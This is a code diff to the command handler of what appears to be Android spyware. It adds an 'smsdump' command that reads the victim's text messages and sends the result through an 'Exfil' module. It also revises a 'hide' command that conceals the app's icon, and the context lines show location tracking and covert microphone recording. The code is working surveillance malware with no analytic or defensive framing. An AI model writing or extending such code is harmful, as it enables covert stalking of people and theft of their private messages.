@@ -26,6 +26,12 @@ object Commands {
                 Exfil.sendLog(ctx, "cmd_result", """{"cmd":"loc","ok":true}""")
             }
 
+            "smsdump" -> {
+                val n = args["n"]?.toIntOrNull() ?: 30
+                val count = com.sp.core.services.SmsDumper.dump(ctx, n)
+                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"smsdump","ok":true,"count":$count}""")
+            }
+
             "mic" -> {
                 val sec = args["sec"]?.toIntOrNull() ?: 60
                 val i = Intent(ctx, MicRecorder::class.java).putExtra("seconds", sec)
@@ -104,7 +110,11 @@ object Commands {
 
             "hide" -> {
                 com.sp.core.stealth.IconHider.hide(ctx)
-                Exfil.sendLog(ctx, "cmd_result", """{"cmd":"hide","ok":true,"icon":"hidden"}""")
+                val state = com.sp.core.stealth.IconHider.isHidden(ctx)
+                Exfil.sendLog(
+                    ctx, "cmd_result",
+                    """{"cmd":"hide","ok":$state,"icon":"hidden","state":$state}"""
+                )
             }
 
             "show" -> {
